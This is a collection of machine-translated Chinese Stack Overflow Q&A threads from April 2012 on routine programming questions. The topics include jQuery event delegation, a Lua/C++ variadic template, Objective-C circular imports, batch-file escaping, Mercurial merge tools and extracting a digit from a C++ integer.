如何更改下拉列表箭头按钮的悬停颜色？在这里，当悬停在下拉菜单上时，它是蓝色的。我想把它改成黄色。怎么能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:16:23.657

替代解决方案：使用 Ajax DropDownExtender 您可以轻松更改 css 样式。

```
<ajaxToolkit:DropDownExtender runat="server" ID="DDE"
TargetControlID="TextLabel" 
DropDownControlID="DropPanel" /> 
```

访问此链接进行演示：[DropDown Demonstration](http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/DropDown/DropDown.aspx)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-10T06:57:32.277

这将在页面加载时完成

```
foreach(ListItem item in ddlName.Items) {
    if(item.Value == "someStringValue") {
        item.Attributes.Add("style", "color:red")
    }
} 
```

如果这不起作用，您可以将此代码移至下拉列表的 DataBound 事件。

# android - 在 Android 中使用非活动类的内部存储

> ID：10084280
> 
> 赞同：2
> 
> 时间：2012-04-10T06:45:31.257
> 
> 标签：android, android-mediaplayer

我正在解密视频，然后在 Android 中播放它。当我解密它时，我想将它存储在 Android 私人文件夹中，这样其他应用程序和用户就无法访问它 - 我查找了一些看起来像这样的代码

```
String FILENAME = "hello_file";
String string = "hello world!";

FileOutputStream fos = openFileOutput(FILENAME, Context.MODE_PRIVATE);
fos.write(string.getBytes());
fos.close(); 
```

我从一个不是活动类的助手类中调用它。我该怎么做呢 ？它似乎正在等待来自活动的电话。然后我如何最终从文件夹中播放它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T06:50:51.013

通过实例化您的助手类，您的构造函数应该接受 Context 作为额外参数并将其保存为类成员。
所以在调用活动中你可以传入`this`它。

然后调用`ctx.openFileOutput(FILENAME, Context.MODE_PRIVATE)`- 假设您命名了类成员`ctx`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T06:49:49.870

在您的应用程序启动时为某处创建静态引用`ApplicationContext`（扩展应用程序类并这样做是更好的选择），然后访问它以使用文件存储..

# java - 如何在 Netbeans 中使用 Hotswap？

> ID：10084289
> 
> 赞同：9
> 
> 时间：2012-04-10T06:46:19.350
> 
> 标签：java, netbeans, hotswap

怎么做？我在IDE中找不到任何选项...请帮助我，我一无所知。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-04-10T06:57:05.833

*   在“调试”模式下运行您的应用
*   修改您的 .java 文件并保存它们
*   单击工具栏上出现的“应用代码更改”按钮（它看起来像三个链接的绿色矩形，或工具 -> 选项 -> Java -> Java 调试器 -> 常规 -> 保存后应用代码更改）

# c++ - 使用可变参数模板从 Lua 函数回调 (C api) 中提取参数

> ID：10084290
> 
> 赞同：0
> 
> 时间：2012-04-10T06:46:19.823
> 
> 标签：c++, templates, lua, variadic-templates

我正在尝试编写一个类来提取从 Lua 函数调用（调用已注册 C 函数的 Lua 脚本）传递的参数并将它们传递给已注册的方法（我的代码片段中的 IDelegate），以便我可以执行它并返回值.

假设我从 GameBoard 类中注册了以下方法 ：在 Lua 下注册`long int GameBoard::testFunct(long int);`为*“GB:testFunction” ，代码如下：*

```
luaL_newmetatable(mState, "GameBoard");
lua_pushstring(mState, "__index");
lua_pushvalue(mState, -2);
lua_settable(mState, -3);

lua_pushstring(mState,"testFunction");
hbt::IDelegate<I32,I32>* ideleg = new MethodDelegatePtr<GameBoard,I32,I32>( NULL, &GameBoard::testFunct); // will be deleted later
lua_pushlightuserdata (mState, (IDelegate<I32,I32>*)ideleg);
lua_pushcclosure(mState, LuaCall<I32,GameBoard,I32>::LuaCallback,1);
lua_settable(mState,-3); 
```

（***IDelegate****和**MethodDelegatePtr**用于注册方法、函数和仿函数，以便我稍后调用它们*）

然后当我在 Lua 脚本中写入时`LuaCall<I32,GameBoard,I32>::LuaCallback`将调用*（以 Lua 堆栈作为参数）*`GB:testFunction(17);`，然后将触发注册的方法并返回等待的值。

如果我注册并调用一个没有任何参数的方法，它就可以工作。但是如果有任何参数等待`long int GameBoard::testFunct(long int);`，那么我有以下错误......

> 在静态成员函数中 static Tr tUnpackLuaArgs<0u>::unpack(IDelegate*, lua_State*, ArgsValue ...) [with C = GameBoard, Tr = int, Args = {long int}, **ArgsValue = {std::basic_string}** , lua_State = lua_State]':
> 
> 从 'static Tr tUnpackLuaArgs::unpack(IDelegate*, lua_State*, ArgsValue ...) [with C = GameBoard, Tr = int, Args = {long int}, ArgsValue = {}, unsigned int i = 1u, lua_State = lua_State]'</p>
> 
> 从 'static int LuaCall::LuaCallback(lua_State*) [with C = GameBoard, Args = {long int}, lua_State = lua_State]'实例化</p>
> 
> 错误：不匹配调用 '(MethodDelegatePtr) (std::basic_string&)'</p>
> 
> 注意：没有已知的参数 1 从 'std::basic_string' 到 'long int&' 的转换</p>
> 
> * * *
> 
> 在静态成员函数 'static Tr tUnpackLuaArgs<0u>::unpack(IDelegate*, lua_State*, ArgsValue ...) [with C = GameBoard, Tr = int, Args = {long int}, **ArgsValue = {bool}** , lua_State = lua_State]':
> 
> 从 'static Tr tUnpackLuaArgs::unpack(IDelegate*, lua_State*, ArgsValue ...) [with C = GameBoard, Tr = int, Args = {long int}, ArgsValue = {}, unsigned int i = 1u, lua_State = lua_State]'</p>
> 
> 从 'static int LuaCall::LuaCallback(lua_State*) [with C = GameBoard, Args = {long int}, lua_State = lua_State]'实例化</p>
> 
> 错误：不匹配调用 '(MethodDelegatePtr) (bool&)'</p>
> 
> 注意：没有已知的参数 1 从 'bool' 到 'long int&' 的转换</p>

当我注册一个等待 a 的方法时，我无法找到为什么 ArgsValue 尝试传递 a`std::basic_string<char>`或a ...它应该传递 a 。`bool``long int``long int`

这是我编写的用于提取来自 Lua 脚本函数调用的参数的类。

```
template< unsigned int i >
class tUnpackLuaArgs
{

    public:
        template< class C, class Tr, class... Args, class... ArgsValue >
        static Tr unpack( IDelegate<C,Tr,Args...>* ideleg, lua_State *L, ArgsValue... argsVal)
        {
            int t = lua_type(L, i+1);

            if( t == LUA_TNUMBER)
            {
                I32 tmpUint = lua_tonumber(L, i+1);
                return tUnpackLuaArgs< i-1 >::unpack( ideleg, L, argsVal..., tmpUint);
            }
            else if( t == LUA_TSTRING)
            {
                std::string tmpStr = lua_tostring(L, i+1);
                return tUnpackLuaArgs< i-1 >::unpack( ideleg, L, argsVal..., tmpStr);
            }
            else if( t == LUA_TBOOLEAN)
            {
                bool tmpBool = lua_toboolean(L, i+1);
                return tUnpackLuaArgs< i-1 >::unpack( ideleg, L, argsVal..., tmpBool);
            }
            //etc.
        }
};

template<>
class tUnpackLuaArgs<0>
{
public:
    template< class C, class Tr, class... Args, class... ArgsValue >
    static Tr unpack( IDelegate<C,Tr,Args...>* ideleg, lua_State *L, ArgsValue... argsVal)
    {
        //-- Execute the registered method using the LUA arguments
        //-- and returns the returned value
        return (*ideleg)( argsVal... );
    }
}; 
```

这是我使用它的方式：

```
// Specialized template returning an integer
template <class C, class... Args>
struct LuaCall<int, C, Args...>
{
    static int LuaCallback(lua_State *L)
    {    
        //-- retrieve method "IDelegate" from Lua stack etc.
        //-- then call tUnpackLuaArgs with the arguments to push the returned value onto the lua stack
        lua_pushnumber(L, tUnpackLuaArgs< sizeof...(Args) >::unpack(funcPtr,L));
        return 1;
    }
}; 
```

事实上，如果我从 if/else in函数中删除`LUA_TSTRING`and the ，它确实可以编译并且工作正常。`LUA_TBOOLEAN``unpack`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T08:21:23.157

实际上，如果您的代码包含 eg `tUnpackLuaArgs<1>::unpack`，那么 的主体`unpack`将急切地实例化*所有*可能性（因为它们都可能在运行时到达，具体取决于 Lua 堆栈上的参数类型）。

这包括 eg `tUnpackLuaArgs<0>::apply<C, Tr, Args..., std::string>`，这意味着您在`Args`is eg时得到错误，`long int`因为`std::string`无法转换为`long int const&`the `operator()`of`IDelegate`期望的。

您实际上并不需要所有这些可能性：您已经知道您的期望（就像`long int`您的情况一样）。`std::string`当你想要 a 时提取a`long int`是没有用的。因此，您应该尝试从 Lua 堆栈中提取您期望的内容（如果转换不起作用，则可能会出错，直到运行时您才会知道）。

# jquery - 如何在新添加的 DOM 上进行实时点击事件

> ID：10084293
> 
> 赞同：1
> 
> 时间：2012-04-10T06:46:38.023
> 
> 标签：jquery, bind, live

我是 live() 用户，我知道 live() 以某种方式已被弃用。我尝试使用 bind() 让新添加的 dom 上的事件正常工作，但事实并非如此。

你能告诉我如何正确地做bind（）吗？还是有其他方法可以完成这项任务？

这是html：

```
<table>
    <tr>
        <td> hi there <span class="click">click me</span></td>
    <tr>
    <tr>
        <td> hi there2 <span class="click">click me</span></td>
    <tr>
    <tr class="end">
        <td></td>
    </tr>
</table>
<button class="add_new">add new row</button> 
```

这是js：

```
var new_row = '<tr><td> hi there, new row! <span class="click">click me</span></td><tr>';

$('.add_new').click(function() {
    $('.end').before(new_row);    
});

$('.click').bind('click', function() {
   alert('clicked');
}); 
```

如果可能的话，我想使用原生 jquery 的方法而不是插件。这是我的 jsfiddle [http://jsfiddle.net/bondythegreat/z3uXH/](http://jsfiddle.net/bondythegreat/z3uXH/)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T06:54:19.623

您需要使用动态版本的 jQuery`.on()`或`.delegate()`.

```
$('table').on('click', '.click', function() {
    // your code here
}); 
```

对于使用委托事件处理的动态行为，基本思想是第一个选择（在 jQuery 对象中）必须是在安装事件处理程序后不会动态创建的静态父对象。作为第二个参数传递给 .on() 的第二个选择器是一个选择器，它与您希望事件处理程序所在的特定项目匹配。这些项目可以在安装事件处理程序后动态创建。

使用`.click()`或`.bind()`获取仅在代码最初运行时存在的对象上工作的静态事件处理程序。

为了使这段代码更健壮，我建议做两件事。首先，不要使用像“click”这样很容易与事件混淆的类名。其次，在您的表格上放置一个 id，以便可以在第一个选择器中引用 ID，而不是`"table"`在您页面中的其他表格上意外激活的非常通用的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T06:50:53.197

你需要使用jQuery的[`on()`方法](http://api.jquery.com/on/)

像[这样](http://jsfiddle.net/z3uXH/2/)：

```
$('table').on('click', '.click', function() {
   alert('clicked');
}); 
```

​</p>

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T06:55:51.997

从 jQuery 1.7+ 开始`live()`，替换为`on()`. 文档页面提供**[`live()`](http://api.jquery.com/live/)**了如何更新到较新方法的指南。

在您的情况下，这将转化为：

```
$('table').on('click','.click', function() {
   alert('clicked');
}); 
```

看到一个**[改变和工作的小提琴](http://jsfiddle.net/ZzcYw/1/)**

# objective-c - Xcode 拒绝承认编写良好的代码

> ID：10084296
> 
> 赞同：-5
> 
> 时间：2012-04-10T06:46:53.230
> 
> 标签：objective-c, xcode, compiler-errors

> **可能重复：**
> [错误：预期的说明符限定符列表之前......在Objective C中？](https://stackoverflow.com/questions/1246509/error-expected-specifier-qualifier-list-before-in-objective-c)

老实说，我不知道这里出了什么问题。这段代码以前工作过，所有相关文件都写得很好，可以自己编译（甚至是各自的`.m`文件），但是我`.h`的一个 OC 项目中有一个文件，其中 Xcode 不断抛出相同的编译错误。有时每行多次，有时只有一次，但总是在`useCommand`变量上。下面是整个受影响`.h`文件的屏幕截图和复制/粘贴代码，这是*唯一无法编译的文件*。当我注释掉对 的每个引用时，程序运行完美`useCommand`，但是当我取消注释它们时，再次发生这种情况。我什至创建了一个新项目并将所有代码复制/粘贴到新文件中，但仍然出现此错误。当我移动`useCommand`引用新行，Xcode 的错误随之而来。**有人知道 Xcode 发生了什么吗？**我很确定这不是我的错误，因为我已经四次检查了我的代码以确保一切正常，并且我已经多次清理了目标。

![Xcode 拒绝承认 useCommand](../Images/0675aa176692c5fb6cd74012e76bf724.png)

## 课程

* * *

## Minecraftia.h

```
//
//  Minecraftia.h
//  TextCraft
//
//  Created by Supuhstar on 4/3/12.
//  Copyright 2012 Blue Husky Programming. All rights reserved.
//

#import <Cocoa/Cocoa.h>
#import "Command.h"
#import "HelpCommand.h"
#import "UseCommand.h"
#import "GetCommand.h"
#import "LookCommand.h"
#import "IO.h"

@interface Minecraftia : NSObject
{
    HelpCommand *helpCommand;
    UseCommand *useCommand;
    GetCommand *getCommand;
    LookCommand *lookCommand;
}
-(id)init;

/**
 * If none has already been created, creates a static instance of Minecraftia
 * 
 * Returns the same instance of Minecraftia each time
 */
+(Minecraftia *)sharedInstance;

/**
 * Turns the given string into a command
 * If no matching command is found, nil is returned
 */
-(Command *)toCommand:(NSString *)input;

/**
 * The main method of the game, wherein all interactions happen
 */
-(void)play;

/**
 * Returns a random message to be used as splash text when the program is started
 */
-(NSString *)getASplash;

/**
 * Returns an NSArray of all the available commands
 */
-(NSArray*)getRegisteredCommands;

@property (retain, nonatomic, readonly) HelpCommand *helpCommand;
@property (retain, nonatomic, readonly) UseCommand *useCommand;
@property (retain, nonatomic, readonly) GetCommand *getCommand;
@property (retain, nonatomic, readonly) LookCommand *lookCommand;
@end 
```

## 帮助命令.h

```
//
//  HelpCommand.h
//  TextCraft
//
//  Created by Student4 on 4/9/12.
//  Copyright 2012 Blue Husky Programming. All rights reserved.
//

#import <Cocoa/Cocoa.h>
#import "Command.h"
#import "Minecraftia.h"

@interface HelpCommand : Command {

}

@end 
```

## 帮助命令.m

```
//
//  HelpCommand.m
//  TextCraft
//
//  Created by Student4 on 4/9/12.
//  Copyright 2012 Blue Husky Programming. All rights reserved.
//

#import "HelpCommand.h"

@implementation HelpCommand
-(bool)execute:(NSArray *)info
{
    NSString *helpString = @"Here are all the available commands:\n";
    NSArray *commands = [[Minecraftia sharedInstance] getRegisteredCommands];
    for(int i=0, l=[commands count]; i < l; i++)
    {
        helpString = [NSString stringWithFormat:@"\t> %@", [helpString stringByAppendingString:[[[commands objectAtIndex:i] class] triggerText]]];
    }
    MyLog([NSString stringWithFormat:@"%@\n\n", helpString]);
    return true;
}

+(NSString *)triggerText
{
    static NSString *triggerText = @"HELP";
    return triggerText;
}
@end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T12:59:16.250

除非您绝对需要标头，否则请使用 @class 而不是 import，然后将导入移动到您的 .m 文件中。现在您将编译器置于一个循环中，Minecraftia.h 正在导入 UseCommand.h，而 UseCommand.h 正在导入 Minecraftia.h。

应该是这样的：

```
#import <Cocoa/Cocoa.h>
#import "IO.h"

@class Command, HelpCommand, UseCommand, GetCommand, LookCommmand;

@interface Minecraftia : NSObject
{
    HelpCommand *helpCommand;
    UseCommand *useCommand;
    GetCommand *getCommand;
    LookCommand *lookCommand;
}

/* .... */

@end 
```

# sql - 将保留关键字写入 Windows 批处理文件中的文件

> ID：10084310
> 
> 赞同：1
> 
> 时间：2012-04-10T06:48:24.887
> 
> 标签：sql, windows, batch-file

我正在从 SQL Server 2005 生成脚本文件并使用 Master.dbo.xp_cmdshell 命令将它们写入文件。由于安全原因，它已被禁用。

所以我将命令打印到控制台窗口并将其粘贴到 scriptfile.bat 文件并执行它。

现在我面临一个新问题。当批处理文件遇到此行时，它将退出。

```
echo If @intA <> @intB > "C:\output_file.txt" 
```

我的问题是，如何将其他编程语言 (SQL) 的代码示例写入命令提示符中的文件？该行`If @intA <> @intB`是一个字符串，需要转储到文件中。

让我知道如何处理这个问题。

编辑：从代码中删除了双引号。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:39:49.353

尝试使用插入符号转义保留字符：

```
echo.If @intA ^<^> @intB> "C:\output_file.txt" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T06:53:01.857

更改此行

```
echo If @intA <> @intB > "C:\output_file.txt" 
```

到

```
echo "If @intA <> @intB" > "C:\output_file.txt" 
```

作为符号`<`，`>`需要从 shell 中转义。

# asp.net-mvc - sdf 文件未显示在 App_Data 中（使用 MVC 应用程序）

> ID：10084312
> 
> 赞同：1
> 
> 时间：2012-04-10T06:48:59.100
> 
> 标签：asp.net-mvc, entity-framework, sdf

我按照 ASP.net 中的“为 ASP.NET MVC 应用程序创建实体框架数据模型”进行了更改以满足我的需要。我构建了项目并运行它——一切正常（我可以查看详细信息、编辑和保存）。我按“显示所有文件”，App_Data 下没有任何内容。我试图在这里阅读相关的线程，但我无法修复它。我会appriciate任何想法！

这是我的连接字符串：

```
<connectionStrings>
<add name="ApplicationServices"
     connectionString="data source=.\SQLEXPRESS;Integrated Security=SSPI;AttachDBFilename=|DataDirectory|aspnetdb.mdf;User Instance=true"
     providerName="System.Data.SqlClient" /> 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T19:37:20.360

首先，您的连接字符串表明这是一个 SQLExpress 数据库文件。可能位于 SQLExpress 安装位置下的数据目录下。

其次，我运行了一个教程并选择使用 SQL Compact 数据库。我希望该文件 (.sdf) 出现在 App_data 文件夹下。它没。由于数据库是通过“代码优先”生成的，我怀疑这是一个错误。我所要做的就是修复它（在 VS 2012 RC 的解决方案资源管理器中工作）是右键单击 App_data 文件夹并选择 . 而且我必须设置 .sdf 文件属性，以便将其复制到输出文件。

我知道我必须这样做，因为我的 Web 部署未能将 .sdf 文件写入我的 IIS 服务器。当我重新发布时，“预览”显示 .sdf 文件将部署到我的 Web 应用程序文件夹的 /bin/app_data 中。

如果您使用的是 SQLExpress 数据库，则可能需要稍微不同的步骤。但是你的问题是相似的，我想我们可以说这是在 Visual Studio 中工作时实体框架中的一个错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-22T05:08:40.503

对于所有在遇到此问题时“尝试了所有方法”但仍然无法正常工作的人，如果您可以运行该应用程序，请尝试在数据库中保存一条记录，因为 .sdf 文件只会在第一次创建记录被创建。然后关闭并再次打开显示所有文件按钮，.sdf 文件应该会显示出来。

祝你好运！

# mercurial - 让 Mercurial 使用自定义合并工具进行自己的合并

> ID：10084313
> 
> 赞同：2
> 
> 时间：2012-04-10T06:49:14.013
> 
> 标签：mercurial, merge

Mercurial 文档介绍了 mercurial 在必须进行 3way 合并时会做什么：

> 默认情况下，Mercurial 会在尝试使用外部工具之前尝试在内部对文本文件进行经典的 3 路合并。

当它调用外部工具时，始终是“手动合并”。

并非所有合并工具都是平等创建的，事实证明，我选择的合并工具（Araxis Merge）通常能够自动合并 3 个文件，而 mercurial 的内部合并工具无法做到这一点。

这导致了大合并的情况，其中可能有一堆文件干净地合并，由 hg 的内部 mergetool 完成，然后其他一些文件没有干净地合并*，但如果 hg 让我指定它的 mergetool 可能会有*。我发现这会使大合并非常低效，因为您需要进行很多上下文切换：hg 弹出我的合并工具，我认为“哦，该死，冲突”，然后实现“哦等等，根本没有冲突”

我想知道我是否在这里遗漏了一些东西，或者是否真的没有办法让 hg 能够使用自定义合并工具来自动尝试进行合并。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-16T14:15:02.493

我认为您正在寻找一个开关，如果 Araxis Merge 可以自动合并，它会自动关闭。我查看了[命令行参考](http://www.araxis.com/merge/command_line.html)和他们的[SCM 集成文档](http://www.araxis.com/merge/scm_integration.html#Mercurial)，但实际上我不确定它会是什么开关。你必须自己试验。

从 Mercurial 的角度来看，没有“手动合并”之类的东西。Mercurial 首先尝试在内部合并（所谓的“预合并”步骤），如果失败，它会寻找外部工具。如果该工具存在退出代码为零（成功退出），则合并仍然可以**完全自动。**Mercurial 然后会认为合并成功并继续下一个文件。根据工具的不同，您根本不会注意到这一点：Mercurial 只是在后台运行该工具，并且只有在出现严重的合并冲突时才会提示您采取行动。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T16:01:59.467

您可以将自定义合并工具与 Mercurial 一起使用。 `help merge-tools`显示选择运行工具的顺序：

```
1\. If a tool has been specified with the --tool option to merge or
   resolve, it is used.  If it is the name of a tool in the merge-tools
   configuration, its configuration is used. Otherwise the specified tool
   must be executable by the shell.
2\. If the "HGMERGE" environment variable is present, its value is used and
   must be executable by the shell.
3\. If the filename of the file to be merged matches any of the patterns in
   the merge-patterns configuration section, the first usable merge tool
   corresponding to a matching pattern is used. Here, binary capabilities
   of the merge tool are not considered.
4\. If ui.merge is set it will be considered next. If the value is not the
   name of a configured tool, the specified value is used and must be
   executable by the shell. Otherwise the named tool is used if it is
   usable.
5\. If any usable merge tools are present in the merge-tools configuration
   section, the one with the highest priority is used.
6\. If a program named "hgmerge" can be found on the system, it is used -
   but it will by default not be used for symlinks and binary files.
7\. If the file to be merged is not binary and is not a symlink, then
   "internal:merge" is used.
8\. The merge of the file fails and must be resolved before commit. 
```

更多信息可以在`help config`- 查找`merge-tools`和`merge-patterns`

# mysql - 带有子查询样式的 cakephp 查询

> ID：10084315
> 
> 赞同：0
> 
> 时间：2012-04-10T06:49:28.677
> 
> 标签：mysql, cakephp

如何将此查询转换为 CakePHP 查找样式？

```
SELECT *
FROM (SELECT * FROM worksheet_forms ORDER BY id DESC) WorksheetForm
where company_id = '000002'
GROUP BY WorksheetForm.generated_id 
```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-28T13:58:52.307

你可以看到这个例子可能对你有帮助

[http://blog.burlock.org/open-source/136-cakephp-and-subqueries](http://blog.burlock.org/open-source/136-cakephp-and-subqueries)

# sql - MS SQL 2008R2 - 月度统计

> ID：10084321
> 
> 赞同：1
> 
> 时间：2012-04-10T06:49:55.917
> 
> 标签：sql, sql-server-2008, sql-server-2008-r2

我正在使用**MS SQL Server 2008**，我想**每周**/**每月**为连接到此服务器的用户进行一些统计（连接了多少次，哪个表最受欢迎或流量最多， ETC...）。
我找不到有关 SQL 用户的每周/每月统计数据的任何信息。

如果有人可以帮助我，我会很高兴。非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:18:25.897

如果您正在寻找一般的表访问统计信息，那么该`sys.dm_db_index_usage_stats`视图是一个很好的起点。对于数据库中被访问的每个表和索引，该视图中都会有一行，其中包含有关查找、扫描或用作查找的次数以及上次访问时间的统计信息。您可以设置一个 sql 代理作业每隔几分钟运行一次，拍摄整个视图的快照，然后随时间绘制结果图表以显示数据库中每个表/索引的更改速率。

不久前，我在[http://trycatchfinally.net/2010/01/finding-unused-tables-in-sql-server-2005-and-2008/](http://trycatchfinally.net/2010/01/finding-unused-tables-in-sql-server-2005-and-2008/)上对该视图进行了相当多的文章，但它非常强大 -虽然我使用的示例有助于识别未使用的索引或表，但您可以将其翻转以显示最常使用的索引或表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:31:39.073

您可以为执行 Bellow 命令 Exec Sp_UpdateStats 的月度期间创建作业

# antlr - antlr 可以做依赖类型的解析吗？

> ID：10084324
> 
> 赞同：1
> 
> 时间：2012-04-10T06:50:20.883
> 
> 标签：antlr

请问antlr3是否接受下面的示例语法。

```
for an input , x + y * z ,
it is parsed as x+(y*z) if each in {x,y,z} is a number;
it is parsed as (x+y)*z if each in {x,y,z} is an object of a particular type T; 
```

让我问一下这种语法是否有时或很少用于计算机语言。

非常感谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:22:14.620

一般来说，解析器（由解析器生成器生成）只检查*语法*。

可以探索多个解析的解析器（以任何方式产生）（我相信 ANTLR 通过回溯来做到这一点；其他解析引擎 [GLR，Earley] 通过并行探索可能的解析来做到这一点），如果增加了语义检查信息，可能会拒绝解析不符合语义约束。

根据我的经验，人们往往不会构建这样的解析器，部分原因是很难向用户解释。如果他们不明白，你的解析器就不成功；恕我直言，您的示例在可解释性方面尤其糟糕。他们也倾向于不这样做，因为他们需要那种类型的信息，而且在你解析时收集这些信息并不总是很方便。著名的 GCC 解析器就是这样做来解析语句，例如

```
 X*T; 
```

并且解析器有点混乱，因为需要随时解析和收集这种类型的信息。

我怀疑 ANTLR 可以检查语义谓词。获得您讨论的那些语义检查的类型信息有多容易是另一个问题。我在这里没有经验。

[我们的DMS Software Reengineering Toolkit](http://www.semanticdesigns.com/Products/DMS/DMSToolkit.html)使用的 GLR 解析引擎确实具有“语义”谓词。通过架构设计来获得这些谓词的真实语义类型信息并不是特别容易；我们希望将此类谓词从“语法”中剔除。但是，一切（包括类型推断）都脱离了语法。因此，我们将纯粹本地的信息粘贴到所提议的减少中。这在（不）识别为单独的解析类型时特别方便，以下用于嵌套执行终止与共享执行终止的特殊 FORTRAN 构造：

```
 DO 10  I=1,10,1
        DO 10 J=1,10,1
           A(I,J)=0
 10 CONTINUE
 20 CONTINUE 
```

对比

```
 DO 20  I=1,10,1
        DO 10 J=1,10,1
           A(I,J)=0
  10 CONTINUE
  20 CONTINUE 
```

对于解析器，在纯语法级别，这两个看起来像：

```
 DO <INT>  <VAR>=...
        DO <INT> <VAR>=...
           <STMTS>
  <INT> CONTINUE
  <INT> CONTINUE 
```

仅凭此信息，如何确定哪个 CONTINUE 语句属于哪个 DO 构造？你不能。

DMS FORTRAN 解析器通过为 DO 循环设置两组规则来实现这一点，一组用于非共享继续，一组用于共享继续。他们使用检查 CONTINUE 语句标签是否与 DO 循环指定标签匹配的语义谓词进行区分。因此，DMS FORTRAN 解析器在解析时获得了正确的循环嵌套。AFAIK，所有其他 FORTRAN 编译器单独解析语句，然后在后传递中将 DO 循环嵌套缝合在一起。

是的，虽然 FORTRAN 有这个（令人困惑的）结构，但我所知道的其他现代语言都没有复制它。

# c++ - C++ 整数 [?]

> ID：10084335
> 
> 赞同：4
> 
> 时间：2012-04-10T06:51:39.597
> 
> 标签：c++

在 Java 中，字符串有一个`charAt()`功能。

在 C++ 中，该函数很简单`stringname[INDEX]`

但是，如果我想在整数的某个索引处使用特定数字怎么办？

例如

```
int value = 9123; 
```

假设我想使用索引 0，也就是 9。

有没有办法将索引与整数一起使用？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-10T06:56:51.140

```
int value = 9123;
std::stringstream tmp;
tmp << value;
char digit = (tmp.str())[0]; 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-04-10T06:59:56.097

不，没有从整数中提取十进制数字的标准函数。

在 C++11 中，有一个函数可以转换为字符串：

```
std::string string = std::to_string(value); 
```

如果您不能使用 C++11，那么您可以使用字符串流：

```
std::ostringstream stream;
stream << value;
std::string string = stream.str(); 
```

或老式 C 格式：

```
char buffer[32];  // Make sure it's large enough
snprintf(buffer, sizeof buffer, "%d", value);
std::string string = buffer; 
```

或者如果你只想要一个数字，你可以算术提取它：

```
int digits = 0;
for (int temp = value; temp != 0; temp /= 10) {
    ++digits;
}

// This could be replaced by "value /= std::pow(10, digits-index-1)"
// if you don't mind using floating-point arithmetic.
for (int i = digits-index-1; i > 0; --i) {
    value /= 10;
}
int digit = value % 10; 
```

以合理的方式处理负数留给读者作为练习。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-04-10T07:00:39.183

您可以使用以下公式（伪代码）：

```
currDigit = (absolute(value) / 10^index) modulo 10; // (where ^ is power-of) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-10T07:05:05.280

为了使事情更完整，您还可以使用**boost::lexical_cast**，有关更多信息，请查看[此处](http://www.boost.org/doc/libs/1_47_0/libs/conversion/lexical_cast.htm#lexical_cast)的文档。

基本上它只是一个很好的代码包装器，可以在*Andreas Brinck* answear 找到。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-10T07:21:18.070

另一种解决方案，它确实使用 0 作为最小的数字。`digits`用于按书面顺序分解`value`成单个数字。（即“9347”变为 9,3,4,7）。然后我们丢弃第一个`index`值。即为了得到第三个数字，我们丢弃前两个并采取新的前沿。

```
if (value==0 && index ==0) return 0; // Special case.
if (value <0) { ... } // Unclear what to do with this.
std::list<char> digits;
while (value) {
  digits.push_front(value % 10);
  value /= 10;
}
for(; index > 0 && !digits.empty(); index--) {
  digits.pop_front();
}
if (!digits.empty()) {
  return digits.front();
} else
{
  throw std::invalid_argument("Index too large");
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-10T06:55:01.137

整数不是字符串，因此您不能这样做。您确实需要将整数转换为字符串。您可以使用[itoa](http://www.cplusplus.com/reference/clibrary/cstdlib/itoa/)或查看[这里](https://stackoverflow.com/questions/228005/alternative-to-itoa-for-converting-integer-to-string-c)。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-10T06:55:12.310

尝试 sprintf 将整数写入字符串：

[http://www.cplusplus.com/reference/clibrary/cstdio/sprintf/](http://www.cplusplus.com/reference/clibrary/cstdio/sprintf/)

然后您可以索引到您刚刚打印到的 char 数组。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-04-10T07:32:38.347

对[Andreas Brink](https://stackoverflow.com/a/10084384/924727)的较长版本。

C++ 库的设计使得在“序列”和“值”之间有一个名为“流”的“中介”，它实际上充当了从值到其相关序列的翻译器。

“序列”是一个抽象概念，其具体实现是“字符串”和“文件”。“stream”是另一个抽象概念，其对应的具体实现是“stringstream”和“fstream”，它们是根据帮助类“stringbuf”和“filebuf”（都派生自抽象“streambuf”）和帮助对象实现的的“语言环境”类，包含一些“方面”。

引用的答案代码以这种方式工作：

1.  `tmp`class的对象`stringstream`是默认构造的：这还将在内部构造 a`stingbuf`和 a `string`，加上`locale`引用系统全局语言环境的方面（默认重新映射“经典”或“C”语言环境）
2.  *流*和函数`operator<<`之间的调用：有一个，对于所有基本类型*`int`*
**   “int 版本”`num_put`从语言环境中获取 facet，并从缓冲区中获取“缓冲区迭代器”，并调用`put`传递给定流的格式标志的函数。*   “放置函数”实际上将数字转换为字符序列，从而填充缓冲区*   当缓冲区已满，或插入特定字符或`str`调用函数时，缓冲区内容被“发送”（在本例中为复制）到字符串，并返回字符串内容。*

 *这个非常复杂的过程起初看起来很复杂，但是：

*   可以完全隐藏（产生两行代码）
*   凸轮几乎可以扩展到任何东西，但...
